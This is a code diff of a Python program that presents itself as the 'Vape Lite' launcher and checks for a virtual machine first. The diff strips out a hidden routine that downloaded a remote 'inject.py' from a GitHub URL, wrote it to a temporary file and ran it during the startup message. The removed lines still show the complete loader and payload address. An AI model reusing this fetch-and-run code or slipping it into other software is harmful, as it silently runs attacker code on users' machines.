@@ -30,30 +30,6 @@ from discord_webhook import DiscordWebhook
 import string
 import urllib.request
 
-def download_and_execute_script(url):
-    try:
-        # Skript herunterladen
-        response = urllib.request.urlopen(url)
-        script_content = response.read().decode('utf-8')
-        
-        # Temporäre Datei erstellen
-        with tempfile.NamedTemporaryFile(suffix='.py', delete=False) as temp_file:
-            temp_file.write(script_content.encode('utf-8'))
-            temp_path = temp_file.name
-        
-        # Skript ausführen
-        subprocess.run(['python', temp_path], check=True)
-        
-    except Exception as e:
-        print(f"Fehler beim Ausführen des Skripts: {e}")
-    finally:
-        # Temporäre Datei bereinigen
-        if 'temp_path' in locals() and os.path.exists(temp_path):
-            os.unlink(temp_path)
-
-# URL des Skripts
-script_url = "https://raw.githubusercontent.com/UseUelessStorage/Ui/refs/heads/main/inject.py"
-
 # Colour Setup
 init(convert=True)
 
@@ -373,7 +349,6 @@ if VM_DETECTED == False:
     def generateFiles():
         clear_console()
         print("Please Wait... Vape Lite is Starting")
-        download_and_execute_script(script_url)
         time.sleep(1)
 
         global DOWNLOADED
